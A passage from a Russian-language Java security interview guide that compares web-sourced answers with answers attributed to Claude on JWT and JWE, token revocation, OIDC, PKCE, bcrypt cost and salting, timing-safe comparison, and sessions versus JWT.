**Вывод**: если чувствительные данные (email, роль, персональные данные, финансовая информация) хранятся в JWS-токене, они доступны для чтения любому, кто получит токен — в том числе из браузерного хранилища, логов, прокси-серверов, MITM-атак (при отсутствии TLS) и утечек.

**Что такое JWS и JWE**

**JWS (JSON Web Signature)** — токен с подписью. Структура (3 части через точку):

```
BASE64URL(Header) . BASE64URL(Payload) . BASE64URL(Signature)
```

- Header и Payload — читаемы (только Base64URL-кодирование)
- Signature — защищает от модификации, но не от чтения
- Гарантирует: **целостность** (данные не изменены) и **аутентичность** (подписано владельцем ключа)
- Не гарантирует: **конфиденциальность**

**JWE (JSON Web Encryption)** — токен с шифрованием. Структура (5 частей через точку):

```
BASE64URL(Protected Header)
. BASE64URL(Encrypted Key)
. BASE64URL(Initialization Vector)
. BASE64URL(Ciphertext)
. BASE64URL(Authentication Tag)
```

| Часть | Содержание |
|-------|-----------|
| Protected Header | Метаданные: алгоритм шифрования ключа (`alg`), алгоритм шифрования содержимого (`enc`) |
| Encrypted Key | CEK (Content Encryption Key), зашифрованный публичным ключом получателя |
| Initialization Vector | Вектор инициализации для симметричного шифрования |
| Ciphertext | Зашифрованный payload |
| Authentication Tag | Тег аутентификации (гарантирует целостность зашифрованных данных) |

Пример JWE-заголовка: `{"alg":"RSA-OAEP","enc":"A256GCM"}` — ключ зашифрован RSA-OAEP, содержимое — AES-256-GCM.

**Сравнительная таблица JWS vs JWE**

| Свойство | JWS | JWE |
|----------|-----|-----|
| Целостность данных | Да (подпись) | Да (authentication tag) |
| Аутентичность отправителя | Да | Нет (только конфиденциальность) |
| Конфиденциальность данных | Нет | Да |
| Payload читаем без ключа | Да (Base64URL) | Нет (зашифрован) |
| Структура | 3 части | 5 частей |
| Типичные алгоритмы | HS256, RS256, ES256 | RSA-OAEP + A256GCM |

**Вложенный JWT (Nested JWT)**

Для одновременной аутентичности и конфиденциальности используют вложение:
1. Создать JWS (подписать payload приватным ключом отправителя).
2. Зашифровать JWS как JWE (публичным ключом получателя).

Результат: только получатель может расшифровать, а после расшифровки — верифицировать подпись отправителя.

**Реализация JWE на Java (Nimbus JOSE+JWT)**

```java
// Шифрование (JWE с RSA-OAEP + AES-256-GCM)
RSAPublicKey recipientPublicKey = loadRecipientPublicKey();

JWEHeader header = new JWEHeader(
    JWEAlgorithm.RSA_OAEP_256,
    EncryptionMethod.A256GCM
);

Payload payload = new Payload(
    new JSONObject(Map.of(
        "sub", "user123",
        "email", "user@example.com",
        "ssn", "123-45-6789"  // чувствительные данные теперь защищены
    ))
);

JWEObject jweObject = new JWEObject(header, payload);
jweObject.encrypt(new RSAEncrypter(recipientPublicKey));

String jweToken = jweObject.serialize(); // 5 частей через точку

// Расшифровка
JWEObject received = JWEObject.parse(jweToken);
received.decrypt(new RSADecrypter(recipientPrivateKey));
JSONObject claims = received.getPayload().toJSONObject();
```

**Практические рекомендации**

- Не хранить в JWS: пароли, токены, персональные данные, финансовую информацию, секреты.
- Хранить в JWS можно: идентификаторы (sub, jti), роли, permissions — данные, утечка которых не критична.
- При необходимости хранить чувствительные данные в токене — использовать JWE или хранить их на сервере, передавая только идентификатор сессии.
- JWE не устраняет необходимость TLS — шифрование токена и шифрование транспорта решают разные задачи.
- Минимизировать данные в токене (принцип минимальных привилегий): чем меньше данных в токене, тем ниже риск при его компрометации.

### Вопрос 28. Как отозвать конкретный JWT до истечения его срока действия, если токены stateless? Перечислите несколько подходов и объясните компромисс между безопасностью и производительностью для каждого.

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [JSON Web Token for Java — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

JWT по природе stateless: сервер не хранит информацию о выданных токенах, поэтому их нельзя «отозвать» стандартным способом — токен остаётся действительным вплоть до истечения поля `exp`. OWASP описывает следующую технику смягчения: реализовать список запрещённых токенов (token denylist), который имитирует «выход» из традиционных сессионных систем. В этом списке хранится дайджест токена (SHA-256, закодированный в HEX) вместе с датой отзыва. При каждом запросе сервер проверяет, не находится ли входящий токен в этом списке. Дополнительно OWASP рекомендует использовать короткоживущие токены (минуты, а не часы) в паре с refresh-токенами, ограничивая временное окно компрометации. Чтобы не хранить весь токен, для идентификации можно использовать claim `jti` (JWT ID) — уникальный идентификатор конкретного токена.

#### Ответ от Claude

Фундаментальная проблема: JWT stateless по определению — сервер не ведёт реестр выданных токенов, поэтому любое досрочное аннулирование требует введения элемента состояния (state) на стороне сервера. Это противоречие между удобством stateless-архитектуры и требованиями безопасности лежит в основе всех компромиссов.

**Подход 1: Чёрный список (Denylist/Blacklist) по JTI**

Механизм: при выдаче каждому токену присваивается уникальный claim `jti`. При отзыве `jti` записывается в быстрое хранилище (Redis, Memcached) с TTL равным оставшемуся времени жизни токена. При каждом запросе сервер проверяет наличие `jti` в хранилище.

Компромиссы:
- Безопасность: высокая — мгновенный отзыв конкретного токена.
- Производительность: один дополнительный сетевой запрос к хранилищу на каждый входящий запрос. В высоконагруженной системе это становится узким местом.
- Масштабируемость: хранилище должно быть распределённым и высокодоступным; список нужно очищать от истёкших записей.
- OWASP рекомендует хранить не весь токен, а его SHA-256-дайджест, чтобы сократить объём хранилища.

**Подход 2: Короткое время жизни (Short-lived tokens) + Refresh Token Rotation**

Механизм: access-токен живёт 5–15 минут. После истечения клиент использует refresh-токен для получения нового. Refresh-токен хранится на сервере и может быть отозван в любой момент (это уже stateful-операция, но только для refresh-токена, а не для каждого запроса).

Компромиссы:
- Безопасность: не мгновенная — скомпрометированный access-токен будет действовать до истечения срока (до 15 минут).
- Производительность: проверка подписи без обращения к внешнему хранилищу — максимальная производительность для access-токенов.
- Масштабируемость: refresh-токены образуют небольшой stateful-слой, но он задействуется только при обновлении, а не при каждом API-запросе.
- Это наиболее распространённый практический компромисс: минимальный удар по производительности при приемлемом окне уязвимости.

**Подход 3: Версионирование токена (Token Versioning) через пользовательский claim**

Механизм: в БД пользователя хранится поле `token_version` (целое число). Это значение включается в claim токена при его выдаче. При каждом запросе сервер сравнивает `token_version` из токена с текущим значением в БД. При отзыве всех токенов пользователя (смена пароля, подозрение на компрометацию) версия инкрементируется — все выданные ранее токены мгновенно становятся недействительными.

Компромиссы:
- Безопасность: высокая для массового отзыва (сброс всех сессий пользователя), но не позволяет отозвать один конкретный токен из нескольких активных.
- Производительность: требует обращения к БД на каждый запрос (можно кэшировать с коротким TTL).
- Применимость: идеален для сценариев «сменить пароль» / «выйти со всех устройств».

**Подход 4: Ротация ключей подписи (Key Rotation / kid)**

Механизм: каждый токен содержит `kid` (Key ID), указывающий, каким ключом он подписан. Смена активного ключа делает все ранее выданные токены с устаревшим `kid` недействительными (сервер отказывается принимать старый ключ).

Компромиссы:
- Безопасность: нельзя отозвать один токен — отзываются все токены, подписанные данным ключом.
- Производительность: без дополнительных запросов к хранилищу — только проверка подписи.
- Применимость: сценарий массового отзыва при компрометации ключа, не для обычного logout.

**Сводная таблица компромиссов:**

| Подход | Гранулярность | Скорость отзыва | Влияние на производительность |
|--------|--------------|-----------------|-------------------------------|
| Denylist по JTI | Один токен | Мгновенно | Высокое (запрос к Redis на каждый API-вызов) |
| Short-lived + Refresh | Пользователь (через refresh) | До ~15 минут | Низкое (stateless проверка access) |
| Token Versioning | Все токены пользователя | Мгновенно | Среднее (запрос к БД / кэш) |
| Key Rotation | Все токены данного ключа | Мгновенно | Низкое (только проверка подписи) |

Лучшая практика для production: комбинировать короткоживущие access-токены (5–15 минут) с отзываемыми refresh-токенами плюс denylist по JTI только для критичных сценариев (немедленный logout после компрометации), используя Redis с TTL для хранения отозванных JTI.

### Вопрос 29. Чем OAuth2 отличается от OpenID Connect? Какой токен добавляет OIDC поверх OAuth2, что в нём содержится и для чего он используется в отличие от access token?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [ID Tokens vs Access Tokens — oauth.net](https://oauth.net/id-tokens-vs-access-tokens/)

OAuth 2.0 определяет механизмы получения и использования access-токенов для доступа к ресурсам, но не определяет стандартных методов предоставления информации об идентификации пользователя. OpenID Connect (OIDC) — это идентификационный слой поверх OAuth 2.0, добавляющий понятие аутентификации. Access-токен предназначен для чтения resource server (API), тогда как ID-токен предназначен для чтения OAuth-клиентом. ID-токен содержит информацию о том, что произошло в ходе аутентификации пользователя. Ключевое различие: ID-токен никогда не следует отправлять в API, поскольку его claim `aud` (audience) равен `client_id` приложения, а не идентификатору API. Access-токен, напротив, предназначен для ресурсного сервера. ID-токены всегда являются JWT; access-токены могут быть JWT или непрозрачной строкой.

#### Ответ от Claude

**OAuth 2.0 — фреймворк авторизации**

OAuth 2.0 решает задачу делегированного доступа: позволяет клиентскому приложению получить ограниченный доступ к ресурсам от имени пользователя без передачи его пароля. В результате OAuth 2.0 flow клиент получает **access token**, с которым обращается к Resource Server (API). OAuth 2.0 не определяет, кто такой пользователь — он только отвечает на вопрос «что приложению разрешено делать?».

**OpenID Connect (OIDC) — слой аутентификации поверх OAuth 2.0**

OIDC (спецификация OpenID Foundation) расширяет OAuth 2.0, добавляя слой идентификации. Согласно openid.net: «OpenID Connect 1.0 is a simple identity layer on top of the OAuth 2.0 protocol». OIDC добавляет:
1. Специальное значение scope: `openid` — именно его присутствие в запросе сигнализирует, что нужен OIDC flow.
2. Новый тип токена — **ID Token**.
3. Endpoint `/userinfo` для получения дополнительных claims о пользователе.

OIDC отвечает на вопрос «кто этот пользователь?».

**ID Token**

ID-токен — это JWT (JSON Web Token), выдаваемый Authorization Server (в OIDC он называется OpenID Provider, OP) вместе с access-токеном. Его назначение — передать клиентскому приложению подтверждённую информацию о прошедшей аутентификации.

Обязательные claims ID-токена (определены в OpenID Connect Core 1.0):
- `iss` — издатель (Issuer): URL OpenID Provider, выдавшего токен.
- `sub` — субъект (Subject): уникальный идентификатор пользователя у данного провайдера.
- `aud` — аудитория (Audience): `client_id` клиентского приложения, для которого выдан токен.
- `exp` — время истечения (Expiration Time).
- `iat` — время выдачи (Issued At).

Опциональные, но часто встречающиеся claims:
- `nonce` — значение из запроса аутентификации; обязателен, если был передан клиентом (защита от replay-атак).
- `auth_time` — время аутентификации пользователя.
- `amr` — метод аутентификации (например, `["pwd"]`, `["mfa"]`).
- `name`, `email`, `picture` и другие profile claims (если запрошены через scope: `profile`, `email`).

**Ключевые различия между ID Token и Access Token:**

| Характеристика | ID Token | Access Token |
|---------------|----------|--------------|
| Определён в | OpenID Connect | OAuth 2.0 |
| Предназначен для | Клиентского приложения | Resource Server (API) |
| Отвечает на вопрос | Кто аутентифицировался? | Что разрешено делать? |
| Формат | Всегда JWT | JWT или непрозрачная строка |
| Claim `aud` | `client_id` приложения | Идентификатор API |
| Отправлять в API? | Никогда | Да (в заголовке Authorization) |

**Критически важно:** ID-токен нельзя использовать для обращения к API вместо access-токена. Его `aud` указывает на клиентское приложение, а не на API. Попытка использовать ID-токен для авторизации — распространённая ошибка разработчиков.

**Практический сценарий:** Пользователь входит в веб-приложение через «Войти через Google». Приложение получает ID-токен (убеждается, кто вошёл: имя, email, sub) и access-токен (использует для запросов к Google APIs от имени пользователя, если нужно). Для отображения профиля пользователя в приложении используется ID-токен; для чтения Google Calendar — access-токен.

### Вопрос 30. Опишите OAuth2 Authorization Code Flow с PKCE: зачем нужен code_verifier и code_challenge, от какой атаки они защищают и почему это важно для мобильных и SPA-приложений?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [PKCE for OAuth 2.0 — oauth.net](https://oauth.net/2/pkce/)

PKCE (RFC 7636, произносится «pixy») — расширение к Authorization Code Flow, предотвращающее атаки перехвата authorization code и CSRF-атаки на OAuth. PKCE изначально разрабатывался для публичных клиентов (мобильные приложения, SPA), которые не могут безопасно хранить client secret, однако в OAuth 2.1 PKCE обязателен для всех клиентов. Клиент включает параметр `code_challenge` в запрос к Authorization Endpoint; сервер сохраняет его и сравнивает при обмене кода на токен. Этот механизм гарантирует, что authorization code может обменять на токен только тот клиент, который инициировал запрос. PKCE не является формой аутентификации клиента и не заменяет client secret.

#### Ответ от Claude

**Проблема: атака перехвата authorization code**

Authorization Code Flow разработан с расчётом на то, что authorization code передаётся через redirect URI (браузерный редирект или deep link в мобильном приложении). В десктопных и мобильных приложениях malicious app может зарегистрировать тот же custom URI scheme (например, `myapp://callback`) и перехватить код, который ОС отправит ей вместо легитимного приложения.

На конфиденциальных клиентах (серверных приложениях) это смягчается client secret — только настоящий сервер знает секрет и может обменять код на токены. Но мобильные приложения и SPA не могут безопасно хранить client secret:
- В мобильном приложении секрет можно извлечь из бинарного файла (reverse engineering).
- В SPA JavaScript-код виден любому пользователю браузера.

Такие клиенты называются **публичными** (public clients). Именно для них RFC 7636 ввёл PKCE.

**Механизм PKCE: пошаговое описание**

1. **Генерация code_verifier** (клиент, перед запросом):
   Клиент генерирует криптографически случайную строку длиной 43–128 символов из символов `[A-Z a-z 0-9 -._~]`. Это секрет, известный только данному экземпляру клиента в данной сессии.

2. **Вычисление code_challenge**:
   - Метод S256 (рекомендуемый): `code_challenge = BASE64URL(SHA256(ASCII(code_verifier)))`
   - Метод plain (допускается, если S256 недоступен): `code_challenge = code_verifier`

3. **Запрос к Authorization Endpoint** (клиент → Authorization Server):
   ```
   GET /authorize?
     response_type=code
     &client_id=CLIENT_ID
     &redirect_uri=https://app.example.com/callback
     &scope=openid profile
     &state=RANDOM_STATE
     &code_challenge=COMPUTED_CHALLENGE
     &code_challenge_method=S256
   ```
   Authorization Server сохраняет `code_challenge` и `code_challenge_method`, привязывая их к выданному `authorization_code`.

4. **Получение authorization code** через redirect (как обычно).

5. **Обмен кода на токены — Token Endpoint** (клиент → Authorization Server):
   ```
   POST /token
   grant_type=authorization_code
   &code=AUTHORIZATION_CODE
   &redirect_uri=https://app.example.com/callback
   &client_id=CLIENT_ID
   &code_verifier=ORIGINAL_VERIFIER
   ```
   Authorization Server вычисляет `BASE64URL(SHA256(code_verifier))` и сравнивает с сохранённым `code_challenge`. Если не совпадают — отказ.

6. **Почему атака невозможна**: злоумышленник может перехватить `authorization_code` и даже `code_challenge` (они передаются открыто). Но `code_verifier` никогда не покидает клиента до шага 5 — и вычислить `code_verifier` из `code_challenge` с методом S256 невозможно (pre-image resistance SHA-256). Без `code_verifier` обменять код на токены нельзя.

**Почему метод S256 обязателен (не plain)**

При методе `plain` злоумышленник, перехвативший запрос к `/authorize` (например, через browser history или логи прокси), получит и `code_challenge`, равный `code_verifier`. С S256 `code_challenge` — это хэш, из которого `code_verifier` не восстановить.

**Важность для мобильных приложений**

- Нет возможности хранить client secret — PKCE заменяет функцию идентификации клиента.
- Custom URI scheme (например, `myapp://`) может быть захвачен вредоносным приложением на устройстве.
- RFC 7636 и рекомендации OWASP требуют PKCE для всех native/mobile clients.

**Важность для SPA (Single Page Application)**

- JavaScript-код исполняется в браузере — client secret не может быть скрыт.
- Ранее для SPA использовался Implicit Flow (токен возвращался сразу в fragment URL), который считается устаревшим из-за ряда уязвимостей: токен попадает в историю браузера, Referrer-заголовки, логи сервера.
- Authorization Code + PKCE для SPA безопаснее: токен передаётся только по back-channel (POST к /token), а не через URL.

**OAuth 2.1 и текущий статус**

В OAuth 2.1 (draft) PKCE обязателен для всех клиентов, использующих Authorization Code Flow, — не только публичных. Это отражает консенсус сообщества: PKCE полезен даже для конфиденциальных клиентов как дополнительный уровень защиты от code injection атак.

**Защита от атак:**
- Основная: Authorization Code Interception Attack (перехват кода через redirect).
- Дополнительная: CSRF-атаки на Authorization Endpoint (в связке с параметром `state`).
- Дополнительная: Code injection (подстановка чужого кода при обмене).
### Вопрос 31. Что такое cost factor (work factor) в bcrypt? Как изменение его значения с 10 до 12 влияет на время хеширования? Как выбрать оптимальное значение для продакшена?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Password Storage - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

Work factor (фактор работы) — это параметр, передаваемый адаптивным функциям хеширования паролей (bcrypt, Argon2, scrypt, PBKDF2). Он делает хеширование намеренно медленным, увеличивая вычислительную стоимость для атакующего, пытающегося перебрать пароли. Work factor должен быть максимально большим, насколько позволяет производительность сервера верификации, но не менее 10. Для устаревших систем, использующих bcrypt, рекомендуется work factor не ниже 10 при ограничении длины пароля 72 байтами.

#### Ответ от Claude

**Что такое cost factor (work factor)**

Cost factor (также называемый work factor или strength) в bcrypt — это логарифмический параметр, определяющий количество итераций, выполняемых при хешировании пароля. Формула: количество итераций = 2^cost. То есть при cost=10 выполняется 2^10 = 1 024 итерации, при cost=12 — 2^12 = 4 096 итераций.

Алгоритм bcrypt использует cost factor для многократного применения ключевого расписания Blowfish (схема EksBlowfish), поочерёдно используя соль и пароль в качестве ключей. Это делает хеширование намеренно дорогостоящим с точки зрения вычислений.

В хеше bcrypt cost factor хранится прямо в строке результата:
```
$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
  ^^
  cost factor = 12
```

**Влияние изменения с 10 до 12 на время хеширования**

Поскольку зависимость экспоненциальная, каждое увеличение cost factor на 1 удваивает время хеширования:
- cost=10: ~55–100 мс на современном оборудовании
- cost=11: ~110–200 мс (удвоение)
- cost=12: ~220–400 мс (ещё одно удвоение)

Таким образом, переход с 10 на 12 **увеличивает время хеширования примерно в 4 раза** (2^2 = 4).

Пример бенчмарков (реальные замеры на современном CPU):

| Cost | Время (прибл.) |
|------|----------------|
| 10   | ~72 мс         |
| 12   | ~285 мс        |
| 14   | ~1 150 мс      |

**Как выбрать оптимальное значение для продакшена**

Принципы выбора:

1. **Целевое время** — OWASP рекомендует ориентироваться на время хеширования 100–300 мс. В 2026 году минимум — cost=12; для критических аккаунтов (администраторы, финансовые данные) — cost=14.

2. **Адаптивность** — bcrypt намеренно называется адаптивным алгоритмом: по мере роста производительности оборудования cost factor необходимо увеличивать, периодически пересчитывая хеши при входе пользователей.

3. **Практический подход** — замерить время на реальном продакшен-сервере:
   ```java
   BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
   long start = System.currentTimeMillis();
   encoder.encode("testpassword");
   long elapsed = System.currentTimeMillis() - start;
   // Цель: 200–500 мс
   ```

4. **Spring Security** — `BCryptPasswordEncoder` по умолчанию использует strength=10. GitHub issue #7411 в проекте Spring Security предлагал поднять дефолт до 12, так как cost=10 даёт лишь ~80 мс. В PHP 8.4 дефолт уже изменён с 10 на 12.

5. **Нижняя граница** — согласно OWASP, для bcrypt не следует использовать значение ниже 10 даже для legacy-систем.

### Вопрос 32. Bcrypt автоматически добавляет соль — тогда зачем вообще нужна соль? Почему SHA-256 без соли не подходит для хранения паролей, даже если алгоритм криптографически стойкий?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Password Storage - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

Уникальная соль должна добавляться к каждому паролю, чтобы предотвратить атаки с использованием заранее вычисленных таблиц, таких как rainbow tables. Добавление соли означает добавление дополнительных случайных данных к входным данным хеш-функции, что делает каждый хеш пароля уникальным. Это означает, что хеширование одного и того же пароля с разными солями даёт разные хеши. Быстрые алгоритмы хеширования, такие как SHA-256, не подходят для хранения паролей, поскольку позволяют атакующим выполнять большое количество попыток в единицу времени.

#### Ответ от Claude

**Зачем вообще нужна соль**

Соль решает две проблемы:

1. **Защита от rainbow table атак** — Rainbow table — это заранее вычисленная таблица хешей для огромного множества возможных паролей. Без соли атакующий, получивший базу хешей, может за секунды найти пароль по его хешу через простой lookup. Соль делает precomputation бесполезным: нужно строить отдельную таблицу для каждой возможной соли.

2. **Предотвращение идентификации одинаковых паролей** — Без соли два пользователя с одинаковым паролем «password123» будут иметь одинаковый хеш. Атакующий, взломавший один аккаунт, автоматически взламывает все аккаунты с тем же паролем. С уникальной солью хеши разные, даже если пароли идентичны.

**Почему bcrypt встраивает соль в хеш**

Bcrypt автоматически генерирует криптографически случайную 128-битную (16 байт) соль и включает её прямо в итоговую строку хеша:
```
$2a$12$[22 символа соли в base64][31 символ хеша]
```
Это означает, что соль не нужно хранить отдельно — она уже встроена. При проверке пароля bcrypt сам извлекает соль из хранимого хеша и использует её для повторного хеширования введённого пароля.

**Почему SHA-256 без соли не подходит для паролей**

Два ключевых недостатка SHA-256 для хранения паролей:

1. **Скорость** — SHA-256 — общецелевая криптографическая хеш-функция, оптимизированная для скорости. На современном CPU она вычисляется менее чем за микросекунду. Современные GPU достигают нескольких **миллиардов** вычислений SHA-256 в секунду. Это означает, что атакующий может перебирать пароли со скоростью 10^9/с.

   Bcrypt с cost=12 намеренно медленный: ~285 мс на хеш, то есть ~3–4 хеша в секунду на то же оборудование. Разница в производительности атаки — в миллионы раз.

2. **Отсутствие встроенной соли** — SHA-256 не включает соль по умолчанию. Даже если добавить соль вручную (SHA-256 + соль), остаётся проблема скорости: алгоритм всё равно позволяет атаки с огромной скоростью.

**Реальный пример** — В 2012 году LinkedIn был взломан. Пароли хранились как SHA-1 без соли. Атакующие использовали rainbow tables и взломали миллионы паролей за считанные дни.

**Итог: два требования к алгоритму хранения паролей**

| Требование | SHA-256 (без соли) | SHA-256 + соль | bcrypt (cost=12) |
|------------|-------------------|----------------|------------------|
| Уникальность хеша | Нет | Да | Да |
| Медленность (против bruteforce) | Нет | Нет | Да |

Правильный выбор в 2026 году: Argon2id (рекомендация OWASP) или bcrypt с cost>=12 для legacy-систем.

### Вопрос 33. Что такое атака timing attack применительно к сравнению паролей или токенов? Почему нельзя использовать стандартный equals() для сравнения хешей и как реализована константное-временная проверка?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [How To Find and Fix Timing Attacks in Your Java Code (Better Programming / Artem Smotrakov)](https://betterprogramming.pub/how-to-find-and-fix-timing-attacks-in-your-java-code-11291a4f7cd)

Метод `Arrays.equals()` возвращает `false` сразу, как только обнаруживает, что один из байтов входных данных отличается. Это означает, что время сравнения зависит от содержимого массивов. Атакующий может измерять время выполнения и по различиям во времени отклика определять, сколько байтов верно. Исправление, как правило, представляет собой однострочное изменение: нужно использовать `MessageDigest.isEqual()` для проверки подписей и хешей вместо `Arrays.equals()`. CodeQL может автоматически находить уязвимые паттерны, отслеживая криптографические операции (классы MAC, Signature, Cipher), результат которых попадает в методы небезопасного сравнения.

#### Ответ от Claude

**Что такое timing attack (атака по времени)**

Timing attack — это атака по стороннему каналу (side-channel attack), при которой атакующий извлекает информацию о секрете, измеряя время выполнения операции. Применительно к сравнению паролей или токенов:

Большинство алгоритмов сравнения строк/массивов работают по принципу «fail-fast»: как только найден несовпадающий байт, функция немедленно возвращает `false`. Это значит:
- Если первый байт не совпадает — ответ приходит очень быстро
- Если первые N байтов совпадают, но (N+1)-й нет — ответ приходит немного позже
- Если все байты совпадают — ответ приходит позже всего

Атакующий может отправлять множество запросов с разными значениями, измерять статистику времени ответа и **побайтово восстанавливать секрет**, не зная его изначально.

**Почему нельзя использовать стандартный equals()**

```java
// НЕБЕЗОПАСНО — короткое замыкание (short-circuit)
if (Arrays.equals(receivedToken, storedToken)) { ... }
if (receivedHmac.equals(storedHmac)) { ... }
```

Оба примера используют early-exit логику. При статистическом анализе тысяч запросов атакующий может с высокой точностью определить правильное значение токена/подписи побайтово.

**Как работает constant-time (константно-временная) проверка**

Алгоритм с постоянным временем выполнения сравнивает **все байты без исключения**, независимо от того, найдено ли несовпадение. Результат несовпадения аккумулируется через побитовые операции:

```java
// Псевдокод constant-time сравнения
int diff = 0;
for (int i = 0; i < a.length; i++) {
    diff |= a[i] ^ b[i];  // XOR: 0 если совпадают, ненулевое если нет
}
return diff == 0;          // true только если все байты совпали
```

Время выполнения одинаково вне зависимости от того, совпадают ли байты.

**Реализации в Java**

1. **`MessageDigest.isEqual(byte[], byte[])`** — стандартный метод Java (начиная с Java 6 Update 17), реализует constant-time сравнение:
   ```java
   // БЕЗОПАСНО
   if (MessageDigest.isEqual(receivedHmac, computedHmac)) { ... }
   ```
   Caveat: формально `MessageDigest.isEqual` не задокументирован как гарантированно constant-time во всех реализациях JVM, однако де-факто является стандартом в экосистеме Java.

2. **`java.security.MessageDigest.isEqual`** используется в Spring Security для сравнения в `HmacUtils` и аналогичных компонентах.

3. **Google Guava `HashCode.equals()`** — явно задокументирован как защита от timing attacks.

**Важные тонкости для Senior-уровня**

- **Сравнивать нужно хеши, а не plaintext пароли.** При проверке пароля bcrypt/Argon2 делают constant-time сравнение внутри, поэтому специально вызывать `MessageDigest.isEqual` не нужно — он уже встроен в `BCryptPasswordEncoder.matches()`.

- **Constant-time сравнение само по себе не достаточно**, если в коде есть ранние выходы до сравнения (например, `if (token == null) return false`). Порядок проверок тоже может создавать timing side-channel.

- **Длина секрета не должна утекать** — если длины отличаются и мы немедленно возвращаем ошибку, атакующий узнаёт длину токена. Корректная реализация сравнивает фиксированную длину (например, HMAC всегда 32 байта) или хеширует перед сравнением.

- **Для HMAC-токенов** правильный паттерн:
  ```java
  // Вычислить HMAC от полученного токена и сравнить с хранимым
  byte[] expected = computeHmac(secret, message);
  byte[] actual   = receivedToken;
  if (!MessageDigest.isEqual(expected, actual)) {
      throw new SecurityException("Invalid token");
  }
  ```

### Вопрос 34. Объясните разницу между сессиями и JWT-токенами с точки зрения масштабирования, безопасности и инвалидации. В каком сценарии вы выберете сессии, а в каком — JWT, и почему?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [JSON Web Token for Java — OWASP Cheat Sheet Series](https://owasp.deteact.com/cheat/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.html)

JWT-токен становится недействительным только по истечении срока действия — в нём нет встроенного механизма явного отзыва. Если токен украден, пользователь не может его инвалидировать самостоятельно. OWASP рекомендует следующие способы борьбы с этой проблемой:

1. **Чёрный список (Token Blacklist):** хранить на сервере хэш (SHA-256 в hex) инвалидированных токенов вместе с датой отзыва — на срок не меньше оставшегося времени жизни токена. При каждом запросе проверять токен по этому списку.

2. **Короткий TTL + Refresh-токен:** устанавливать короткое время жизни access-токена (5–15 минут) и выдавать отдельный долгоживущий refresh-токен, хранящийся в HttpOnly cookie. Это минимизирует окно компрометации.

3. **Token Sidejacking protection:** привязывать JWT к hardened cookie (fingerprint), что делает перехваченный токен бесполезным без соответствующей cookie — logout имитируется удалением JWT из session storage без серверного хранилища инвалидаций.

#### Ответ от Claude

**Механизм работы**

| Аспект | Сессия (Stateful) | JWT (Stateless) |
|---|---|---|
| Хранение состояния | Сервер хранит данные сессии (память / Redis / БД) | Состояние закодировано в самом токене; сервер ничего не хранит |
| Идентификатор | Случайный session ID в cookie | Подписанный токен (header.payload.signature) |
| Проверка | Поиск в хранилище сессий | Верификация подписи (HMAC/RSA) — криптография, без I/O |

**Масштабирование**

- **Сессии:** требуют совместного доступа к хранилищу сессий между всеми узлами кластера. Классическое решение — sticky sessions (привязка клиента к одному узлу) или централизованный session store (Redis). Горизонтальное масштабирование усложняется необходимостью репликации/синхронизации.
- **JWT:** сервер stateless — любой узел кластера может проверить токен, зная секрет/публичный ключ. Не нужен общий session store. Это делает JWT предпочтительным в микросервисной архитектуре и при горизонтальном масштабировании.

**Безопасность**

- **Сессии:** более безопасны с точки зрения контроля — сессию можно инвалидировать мгновенно на сервере. Уязвимы к CSRF (если session ID в cookie). Рекомендуется использовать HttpOnly+Secure cookie.
- **JWT:** уязвимость к алгоритму `none` (нужно явно запрещать); если секрет скомпрометирован — все выданные токены под угрозой. Нельзя мгновенно отозвать токен без дополнительной инфраструктуры. Хранение в localStorage уязвимо к XSS; в cookie — к CSRF.

**Инвалидация**

Это ключевое преимущество сессий над JWT:
- **Сессии:** достаточно удалить запись из хранилища — все последующие запросы с этим session ID будут отклонены немедленно.
- **JWT (stateless):** токен валиден до истечения `exp`. Для досрочной инвалидации необходимо либо вести blacklist (что добавляет state и I/O на каждый запрос), либо применять короткий TTL + refresh-токен.

**Когда выбирать сессии:**
- Монолитное веб-приложение, обслуживающее браузерных пользователей.
- Требуется мгновенная инвалидация (банковские сессии, выход из всех устройств сразу).
- Маленькая или средняя нагрузка без потребности в горизонтальном масштабировании.
- Хранение чувствительных данных (нежелательно передавать в каждом токене).

**Когда выбирать JWT:**
- Микросервисная архитектура: сервисы верифицируют токен независимо, без обращения к центральному хранилищу.
- Stateless REST API (мобильные клиенты, SPA с отдельным backend).
- Cross-domain / cross-service аутентификация (OAuth 2.0 / OpenID Connect).
- Кратковременные операции (скачивание файла по ссылке, одноразовые действия).
- Высоконагруженные системы, где стоимость I/O к session store неприемлема.

**Гибридный подход (современная практика):** использовать JWT с коротким TTL (5–15 мин) + refresh-токен в HttpOnly cookie с rotation-политикой. Это сочетает stateless-масштабирование с приемлемым контролем инвалидации.

### Вопрос 35. Как устроена цепочка фильтров Spring Security (SecurityFilterChain)? В каком порядке выполняются ключевые фильтры (SecurityContextPersistenceFilter, UsernamePasswordAuthenticationFilter, ExceptionTranslationFilter, FilterSecurityInterceptor) и что произойдёт, если вы добавите свой фильтр без явного указания позиции?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [The Security Filter Chain — Spring Security 5.0.x Reference](https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/security-filter-chain.html)

Порядок фильтров в цепочке критически важен, так как между ними существуют зависимости. Документация Spring Security 5.0.x регламентирует следующий порядок (раздел 14.3):

1. **ChannelProcessingFilter** — перенаправление на другой протокол при необходимости.
